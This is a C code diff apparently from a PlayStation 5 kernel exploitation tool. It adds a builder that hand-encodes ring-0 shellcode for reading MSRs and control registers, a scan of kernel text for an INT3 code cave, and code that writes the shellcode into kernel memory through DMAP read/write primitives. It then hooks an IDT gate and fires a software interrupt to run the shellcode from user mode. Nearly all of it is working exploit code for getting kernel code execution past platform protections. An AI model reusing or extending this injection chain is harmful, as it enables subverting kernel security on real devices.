@@ -156,7 +156,9 @@ struct kld_sym_lookup {
 
 #define SYS_kldload     304
 #define SYS_kldunload   305
-#define SYS_kldstat     306
+#define SYS_kldfind     306
+#define SYS_kldnext     307
+#define SYS_kldstat     308   /* NOT 306 (that's kldfind) */
 #define SYS_kldsym      337
 #define KLDSYM_LOOKUP   1
 
@@ -1069,6 +1071,130 @@ static void campaign_iommu_recon(void) {
  *   - Kernel handles all memory management and relocation
  *   - Works on FW < 6.50 (GMET not enforced)
  */
+/* ============================================================
+ * Shellcode builder: generates a minimal ring-0 MSR reader
+ *
+ * Builds position-independent machine code that:
+ *   1. Saves clobbered registers
+ *   2. Writes magic/status to shared output buffer (DMAP KVA)
+ *   3. Reads MSRs and CRs via RDMSR / MOV CRn
+ *   4. Stores results in kmod_result_buf format
+ *   5. Restores registers and IRETQ back to ring 3
+ *
+ * The output KVA is embedded as a 64-bit immediate (movabs).
+ * No relocations needed — fully self-contained.
+ * ============================================================ */
+static int build_msr_shellcode(uint8_t *buf, int bufmax, uint64_t output_kva) {
+    int p = 0;
+
+    /* Helper macros for common x86-64 encodings */
+    #define EMIT(b) do { if (p < bufmax) buf[p++] = (uint8_t)(b); } while(0)
+    #define EMIT_U32(v) do { uint32_t _v=(v); memcpy(&buf[p],&_v,4); p+=4; } while(0)
+    #define EMIT_U64(v) do { uint64_t _v=(v); memcpy(&buf[p],&_v,8); p+=8; } while(0)
+
+    /* Prologue: save registers we clobber (RAX, RCX, RDX, RDI) */
+    EMIT(0x50);  /* push rax */
+    EMIT(0x51);  /* push rcx */
+    EMIT(0x52);  /* push rdx */
+    EMIT(0x57);  /* push rdi */
+
+    /* movabs $output_kva, %rdi */
+    EMIT(0x48); EMIT(0xBF); EMIT_U64(output_kva);
+
+    /* Write magic: movabs $KMOD_MAGIC, %rax; mov %rax, (%rdi) */
+    EMIT(0x48); EMIT(0xB8); EMIT_U64(0xCAFEBABEDEAD1337ULL);
+    EMIT(0x48); EMIT(0x89); EMIT(0x07);  /* mov %rax, (%rdi) */
+
+    /* status = RUNNING: movl $1, 8(%rdi) */
+    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(1);
+
+    /* MSR/CR reading table.
+     * kmod_result_buf.msr_results starts at offset 32, each entry is 16 bytes:
+     *   +0: uint32_t msr_id
+     *   +4: uint32_t valid
+     *   +8: uint64_t value */
+    static const struct { uint32_t id; int is_cr; } msr_table[] = {
+        { 0xC0000080, 0 },  /* EFER */
+        { 0xC0000081, 0 },  /* STAR */
+        { 0xC0000082, 0 },  /* LSTAR */
+        { 0xC0000084, 0 },  /* SFMASK */
+        { 0xC0000100, 0 },  /* FS_BASE */
+        { 0xC0000101, 0 },  /* GS_BASE */
+        { 0xC0000102, 0 },  /* KGS_BASE */
+        { 0xC0000103, 0 },  /* TSC_AUX */
+        { 0xFFFF0000, 1 },  /* CR0 (pseudo-MSR) */
+        { 0xFFFF0003, 1 },  /* CR3 */
+        { 0xFFFF0004, 1 },  /* CR4 */
+    };
+    int n_entries = sizeof(msr_table) / sizeof(msr_table[0]);
+
+    for (int i = 0; i < n_entries; i++) {
+        int32_t id_off  = 32 + i * 16;       /* msr_results[i].msr_id */
+        int32_t val_off = 32 + i * 16 + 4;   /* msr_results[i].valid */
+        int32_t dat_off = 32 + i * 16 + 8;   /* msr_results[i].value */
+
+        if (!msr_table[i].is_cr) {
+            /* mov $msr_num, %ecx */
+            EMIT(0xB9); EMIT_U32(msr_table[i].id);
+            /* rdmsr → EDX:EAX */
+            EMIT(0x0F); EMIT(0x32);
+            /* shl $32, %rdx */
+            EMIT(0x48); EMIT(0xC1); EMIT(0xE2); EMIT(0x20);
+            /* or %rdx, %rax */
+            EMIT(0x48); EMIT(0x09); EMIT(0xD0);
+        } else {
+            uint32_t cr = msr_table[i].id & 0xF;
+            /* mov %crN, %rax: 0F 20 (C0 + N*8) */
+            EMIT(0x0F); EMIT(0x20); EMIT(0xC0 + cr * 8);
+        }
+
+        /* Store msr_id: movl $id, disp(%rdi) */
+        if (id_off < 128) {
+            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)id_off);
+        } else {
+            EMIT(0xC7); EMIT(0x87); EMIT_U32(id_off);
+        }
+        EMIT_U32(msr_table[i].id);
+
+        /* Store valid=1: movl $1, disp(%rdi) */
+        if (val_off < 128) {
+            EMIT(0xC7); EMIT(0x47); EMIT((uint8_t)val_off);
+        } else {
+            EMIT(0xC7); EMIT(0x87); EMIT_U32(val_off);
+        }
+        EMIT_U32(1);
+
+        /* Store value: mov %rax, disp(%rdi) */
+        if (dat_off < 128) {
+            EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT((uint8_t)dat_off);
+        } else {
+            EMIT(0x48); EMIT(0x89); EMIT(0x87); EMIT_U32(dat_off);
+        }
+    }
+
+    /* num_msr_results = n_entries: movl $n, 24(%rdi) */
+    EMIT(0xC7); EMIT(0x47); EMIT(0x18); EMIT_U32((uint32_t)n_entries);
+
+    /* status = DONE: movl $2, 8(%rdi) */
+    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(2);
+
+    /* mfence */
+    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
+
+    /* Epilogue: restore and return from interrupt */
+    EMIT(0x5F);  /* pop rdi */
+    EMIT(0x5A);  /* pop rdx */
+    EMIT(0x59);  /* pop rcx */
+    EMIT(0x58);  /* pop rax */
+    EMIT(0x48); EMIT(0xCF);  /* iretq */
+
+    #undef EMIT
+    #undef EMIT_U32
+    #undef EMIT_U64
+
+    return p;
+}
+
 static void campaign_kmod_kldload(void) {
     printf("\n=============================================\n");
     printf("  Campaign 7: Kernel Module (kldload)\n");
@@ -1313,7 +1439,33 @@ static void campaign_kmod_kldload(void) {
         return;
     }
     printf("[+] Module loaded! kid=%d\n", kid);
-    printf("    SYSINIT has already executed - campaigns complete.\n");
+
+    /* kldstat diagnostic: get the module's reported load address */
+    struct kld_file_stat kfs;
+    memset(&kfs, 0, sizeof(kfs));
+    kfs.version = sizeof(kfs);
+    int ks_ret = syscall(SYS_kldstat, kid, &kfs);
+    printf("    kldstat(%d): ret=%d, address=0x%lx, size=0x%lx\n",
+           kid, ks_ret, (unsigned long)kfs.address, (unsigned long)kfs.size);
+    if (kfs.address != 0) {
+        printf("    kldstat reports module at 0x%lx (%lu bytes)\n",
+               (unsigned long)kfs.address, (unsigned long)kfs.size);
+        /* Try reading the first 16 bytes from the reported address via DMAP */
+        uint64_t mod_pa = va_to_pa_quiet(kfs.address);
+        if (mod_pa != 0) {
+            uint8_t mod_hdr[16];
+            kernel_copyout(g_dmap_base + (mod_pa & ~0xFFFULL) +
+                           (kfs.address & 0xFFF), mod_hdr, 16);
+            printf("    First 16 bytes at module base: ");
+            for (int i = 0; i < 16; i++) printf("%02x ", mod_hdr[i]);
+            printf("\n");
+        } else {
+            printf("    va_to_pa(0x%lx) returned 0 — page not mapped?\n",
+                   (unsigned long)kfs.address);
+        }
+    } else {
+        printf("    kldstat returned address=0 — kernel linker may not track module base.\n");
+    }
 
     /* Step 4: Read results directly from shared buffer.
      * The kmod's hv_init wrote results to result_kva (DMAP-mapped).
@@ -1383,6 +1535,48 @@ static void campaign_kmod_kldload(void) {
                (unsigned long)g_kdata_base, (unsigned long)g_ktext_base,
                (unsigned long)g_dmap_base);
 
+        /* ── kldstat-directed check ──
+         * If kldstat reported a module base address, try reading directly
+         * from there first (saves the expensive full scan). */
+        uint64_t trampoline_kva = 0;
+        uint8_t hdr[64];
+
+        if (kfs.address != 0) {
+            printf("[*] Trying kldstat-reported base 0x%lx...\n",
+                   (unsigned long)kfs.address);
+            uint64_t mod_pa = va_to_pa_quiet(kfs.address);
+            if (mod_pa != 0) {
+                /* Read via DMAP to avoid XOM issues */
+                if (kernel_copyout(g_dmap_base + mod_pa, hdr, sizeof(hdr)) == 0) {
+                    printf("    First 16 bytes: ");
+                    for (int i = 0; i < 16; i++) printf("%02x ", hdr[i]);
+                    printf("\n");
+                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
+                        memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
+                        trampoline_kva = kfs.address;
+                        printf("[+] Trampoline found at kldstat base 0x%lx!\n",
+                               (unsigned long)trampoline_kva);
+                    }
+                }
+            } else {
+                printf("    Page not mapped in kernel page table.\n");
+            }
+        }
+
+        /* ── DMAP readability test for ktext (XOM diagnostic) ── */
+        if (trampoline_kva == 0) {
+            uint64_t kt_pa = va_to_pa_quiet(g_ktext_base);
+            if (kt_pa != 0) {
+                uint8_t kt_hdr[16];
+                int kt_ok = kernel_copyout(g_dmap_base + kt_pa, kt_hdr, 16);
+                printf("[*] XOM test: ktext PA=0x%lx, DMAP read %s, bytes: ",
+                       (unsigned long)kt_pa, kt_ok == 0 ? "OK" : "FAIL");
+                if (kt_ok == 0)
+                    for (int i = 0; i < 16; i++) printf("%02x ", kt_hdr[i]);
+                printf("\n");
+            }
+        }
+
         /* ── XOM-safe FAST hierarchical scan ──
          *
          * We CANNOT kernel_copyout arbitrary kernel VAs (XOM pages cause
@@ -1400,24 +1594,24 @@ static void campaign_kmod_kldload(void) {
          * 1GB range.
          */
 
-        uint64_t trampoline_kva = 0;
         uint64_t total_2mb_checked = 0, total_2mb_mapped = 0;
         uint64_t total_pages_mapped = 0;
-        uint8_t hdr[64];
 
         /* Scan ranges */
         struct { uint64_t start, end; const char *label; } ranges[4];
         int nranges = 0;
 
-        /* Range 1: kernel heap (right after kernel BSS → +1GB)
+        /* Range 1: full kernel heap (kdata+32MB → end of VA space)
          * ALLPROC is at kdata+0x27EDCB8 (~40MB), so BSS extends
          * at least that far.  virtual_avail (heap start) is after BSS.
-         * Start at kdata+32MB to cover the transition zone.
-         * The hierarchical scan skips unmapped chunks instantly. */
+         * Start at kdata+32MB; scan to near the top of the canonical
+         * address space.  The hierarchical walker skips unmapped 512GB/
+         * 1GB/2MB regions instantly, so this is fast despite the huge
+         * VA range. */
         {
             uint64_t s = g_kdata_base + 0x2000000;  /* +32MB */
-            uint64_t e = s + 0x40000000ULL; /* +1GB cap */
-            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "kdata+32MB"}; }
+            uint64_t e = 0xFFFFFFFFFFFFF000ULL;     /* near top of VA */
+            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "kdata→top"}; }
         }
         /* Range 2: DMAP end → kernel text */
         {
@@ -1639,12 +1833,132 @@ static void campaign_kmod_kldload(void) {
                (unsigned long)total_2mb_checked, (unsigned long)total_2mb_mapped,
                (unsigned long)total_pages_mapped);
 
+        /* ── Step 4c: Direct shellcode injection (if kldload module not found) ──
+         *
+         * kldload on PS5 creates a kid but does NOT load module code/data
+         * into kernel memory (Sony gutted the kernel linker).
+         *
+         * Fallback: write self-contained MSR-reading shellcode into a ktext
+         * code cave, hook an IDT entry, trigger INT from ring 3, then
+         * restore everything. On FW 4.03 without GMET, ktext pages are
+         * writable via DMAP and executable.
+         */
+        uint64_t injected_cave_pa = 0;  /* non-zero if we injected shellcode */
+        int injected_sc_len = 0;
+        uint8_t cave_backup[1024];
+
         if (trampoline_kva == 0) {
             printf("[-] Trampoline not found in any scan range.\n");
-            goto idt_skip;
+            printf("\n[*] Step 4c: Direct shellcode injection into ktext code cave...\n");
+
+            /* Build MSR-reading shellcode */
+            uint8_t shellcode[1024];
+            int sc_len = build_msr_shellcode(shellcode, sizeof(shellcode), result_kva);
+            printf("[+] Shellcode built: %d bytes\n", sc_len);
+
+            /* Scan ktext for a code cave (consecutive 0xCC / INT3 bytes) */
+            printf("[*] Scanning ktext for code cave (need %d bytes of 0xCC)...\n", sc_len);
+            uint64_t cave_kva = 0;
+            uint64_t cave_pa = 0;
+            uint8_t kpage[4096];
+
+            /* Scan first 4MB of ktext for a suitable cave */
+            uint64_t kt_scan_start = g_ktext_base;
+            uint64_t kt_scan_end = g_ktext_base + 0x400000;
+            int best_run = 0;
+            uint64_t best_run_kva = 0, best_run_pa = 0;
+
+            for (uint64_t kva = kt_scan_start; kva < kt_scan_end; kva += 0x1000) {
+                uint64_t pa = va_to_pa_quiet(kva);
+                if (pa == 0) continue;
+                if (kernel_copyout(g_dmap_base + pa, kpage, 4096) != 0) continue;
+
+                /* Count consecutive 0xCC bytes in this page */
+                int run = 0;
+                for (int off = 0; off < 4096; off++) {
+                    if (kpage[off] == 0xCC) {
+                        run++;
+                        if (run >= sc_len && run > best_run) {
+                            best_run = run;
+                            /* Cave starts at (off - run + 1) */
+                            best_run_kva = kva + (off - run + 1);
+                            best_run_pa = pa + (off - run + 1);
+                        }
+                    } else {
+                        run = 0;
+                    }
+                }
+            }
+
+            if (best_run >= sc_len) {
+                cave_kva = best_run_kva;
+                cave_pa = best_run_pa;
+                printf("[+] Code cave found: KVA=0x%lx PA=0x%lx (%d bytes of 0xCC)\n",
+                       (unsigned long)cave_kva, (unsigned long)cave_pa, best_run);
+            } else {
+                printf("[-] No suitable code cave found (best run: %d, need %d).\n",
+                       best_run, sc_len);
+                printf("    Trying kdata region for code cave...\n");
+
+                /* Fallback: scan first 4MB of kdata for 0xCC or 0x00 runs */
+                for (uint64_t kva = g_kdata_base; kva < g_kdata_base + 0x400000; kva += 0x1000) {
+                    uint64_t pa = va_to_pa_quiet(kva);
+                    if (pa == 0) continue;
+                    if (kernel_copyout(g_dmap_base + pa, kpage, 4096) != 0) continue;
+                    int run = 0;
+                    for (int off = 0; off < 4096; off++) {
+                        if (kpage[off] == 0xCC || kpage[off] == 0x00) {
+                            run++;
+                            if (run >= sc_len && run > best_run) {
+                                best_run = run;
+                                best_run_kva = kva + (off - run + 1);
+                                best_run_pa = pa + (off - run + 1);
+                            }
+                        } else {
+                            run = 0;
+                        }
+                    }
+                }
+                if (best_run >= sc_len) {
+                    cave_kva = best_run_kva;
+                    cave_pa = best_run_pa;
+                    printf("[+] Code cave in kdata: KVA=0x%lx PA=0x%lx (%d bytes)\n",
+                           (unsigned long)cave_kva, (unsigned long)cave_pa, best_run);
+                } else {
+                    printf("[-] No code cave found anywhere (best: %d bytes).\n", best_run);
+                    goto idt_skip;
+                }
+            }
+
+            /* Save original bytes from code cave */
+            kernel_copyout(g_dmap_base + cave_pa, cave_backup, sc_len);
+            printf("[*] Saved %d bytes from code cave.\n", sc_len);
+            injected_cave_pa = cave_pa;
+            injected_sc_len = sc_len;
+
+            /* Write shellcode to code cave via DMAP */
+            printf("[*] Writing shellcode to DMAP+0x%lx...\n",
+                   (unsigned long)cave_pa);
+            kernel_copyin(shellcode, g_dmap_base + cave_pa, sc_len);
+
+            /* Verify write */
+            uint8_t verify[16];
+            kernel_copyout(g_dmap_base + cave_pa, verify, 16);
+            printf("    Verify: ");
+            for (int i = 0; i < 16; i++) printf("%02x ", verify[i]);
+            printf("\n");
+            if (memcmp(verify, shellcode, 16) != 0) {
+                printf("[-] Write verification FAILED — DMAP write to ktext blocked?\n");
+                goto idt_skip;
+            }
+            printf("[+] Shellcode written and verified.\n");
+
+            trampoline_kva = cave_kva;
         }
 
-        /* ── 4b-2: Read IDTR (SIDT is unprivileged on AMD64) ── */
+        /* ── IDT hook: common path for both kldload trampoline and injected shellcode ── */
+
+        /* Read IDTR (SIDT is unprivileged on AMD64) */
         struct {
             uint16_t limit;
             uint64_t base;
@@ -1682,7 +1996,7 @@ static void campaign_kmod_kldload(void) {
         uint16_t kernel_cs = ref_gate.selector;
         printf("[*] Kernel CS: 0x%04x (from IDT[14])\n", kernel_cs);
 
-        /* ── 4b-3: Install IDT gate ── */
+        /* Install IDT gate */
         struct idt_gate new_gate;
         memset(&new_gate, 0, sizeof(new_gate));
         new_gate.offset_lo  = (uint16_t)(trampoline_kva & 0xFFFF);
@@ -1699,21 +2013,27 @@ static void campaign_kmod_kldload(void) {
         /* Clear buffer before invocation */
         memset((void *)result_vaddr, 0, KMOD_RESULT_ALLOC_SIZE);
 
-        /* ── 4b-4: Fire! ── */
-        printf("[*] Triggering INT %u → hv_idt_trampoline → hv_init...\n", HV_IDT_VECTOR);
+        /* Fire! */
+        printf("[*] Triggering INT %u → shellcode → MSR reads...\n", HV_IDT_VECTOR);
         __asm__ volatile("int $210" ::: "memory");
         printf("[+] Returned from ring-0 interrupt handler!\n");
 
-        /* ── 4b-5: Restore original IDT entry ── */
+        /* Restore original IDT entry */
         kernel_copyin(&orig_gate, gate_addr, sizeof(orig_gate));
         printf("[*] IDT[%u] restored.\n", HV_IDT_VECTOR);
+
+        /* Restore code cave if we injected shellcode */
+        if (injected_cave_pa != 0) {
+            kernel_copyin(cave_backup, g_dmap_base + injected_cave_pa, injected_sc_len);
+            printf("[*] Code cave bytes restored (%d bytes).\n", injected_sc_len);
+        }
 
         /* Re-check results */
         memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));
         if (first_qword != 0)
-            printf("[+] Buffer is no longer zero — IDT invocation worked!\n");
+            printf("[+] Buffer is no longer zero — code execution worked!\n");
         else
-            printf("[-] Buffer still zero after IDT invocation.\n");
+            printf("[-] Buffer still zero after INT invocation.\n");
 
 idt_skip: ;
     }
